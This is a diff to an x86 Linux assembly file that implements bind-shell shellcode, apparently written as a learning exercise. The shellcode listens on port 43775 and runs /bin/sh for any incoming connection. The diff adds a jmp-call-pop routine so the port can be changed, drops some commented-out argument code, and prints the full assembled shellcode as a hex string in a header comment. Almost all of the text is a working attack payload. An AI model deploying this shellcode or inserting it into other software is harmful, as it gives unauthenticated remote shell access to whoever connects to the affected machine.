@@ -3,12 +3,16 @@
 ; 2013 March
 ;
 ; DESC:
-; Binds to a port 12345
+; Binds to a port 43775
 ; Execs Shell on incoming connection
 ;
-; TODO:
-; 1. Port number should be easily configurable;
-; 2. Reduce shellcode size as much as possible;
+;
+;
+; Shellcode "\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xeb\x6d\x5f\x31\xc0\xb0\x66\x31\xdb\xb3\x02\x31\xd2\x52\x66\xff\x37\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x04\x6a\x01\x56\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x05\x31\xd2\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x31\xc0\xb0\x3f\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\x31\xc0\xb0\x0b\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x52\x89\xe2\xcd\x80\xe8\x8e\xff\xff\xff\xaa\xff"
+;
+; Port is the last two bytes of the shellcode. In hex \xaa\xff  (0xaaff = 43775)
+;
+;
 ;
 
 global _start
@@ -69,16 +73,6 @@ _start:
 	;
 
 	;
-	; Arguments
-	; As long as the stack is growing down, to take arguments, you need get back in stack
-	; To get back in stack you need to +N stack (ESP), or use pop as below:
-	;pop ebp ; or mov eax, [esp+4]		; argc - total amount of args
-	;pop ebp ; or mov ebx, [esp+8]		; argv[0] - this program itself
-	;pop ebp ; or mov ecx, [esp+12]		; argv[1] - port (user specified)
-	;
-	;;push dword [esp+8]
-
-	;
 	; =============================== SOCKET =====================================
 	;
 	; int socket(int domain, int type, int protocol);
@@ -121,8 +115,12 @@ _start:
 	; int socketcall(int call, unsigned long *args)
 	; socketcall	SYS_BIND	bind() args
 	; EAX,		EBX,		ECX
-	; 102		2		(sockfd, {2, 12345, 0}, 16)
+	; 102		2		(sockfd, {2, 43775, 0}, 16)
 	;
+
+	jmp short call_get_port
+port_in_esp:
+	pop edi			; getting port address from ESP
 
 	; EAX
 	xor eax, eax
@@ -135,8 +133,10 @@ _start:
 	; ECX
 	xor edx, edx
 	push edx		; ANY HOST (0.0.0.0)}			||		struct in_addr sin_addr (unsigned long s_addr) };
-	;; push DWORD 0x0100007f	; For 127.0.0.1 HOST
-	push WORD 0x3930	; PORT 12345 (reverse),			||	 	unsigned short sin_port,
+	;push DWORD 0x0100007f	; For 127.0.0.1 HOST
+	;push WORD 0xffaa	; PORT 43775 (reverse),			||	 	unsigned short sin_port,
+	push WORD [edi]		; PORT is specified in the bottom of the code / shellcode. Last two bytes in HEX.
+
 	push WORD bx		; 2 - AF_INET				|| struct sockaddr { short sin_family,
 	mov ecx, esp		; Save PTR to sockaddr struct in ECX
 
@@ -290,3 +290,8 @@ _start:
 	; xor ebx, ebx	; 0 code means success
 	; int 0x80
 	;
+
+call_get_port:
+	call port_in_esp
+;	dw 0xffaa		; WORD (43775 in reverse hex)
+	db 0xaa, 0xff		; BYTE (43775 in straight hex)
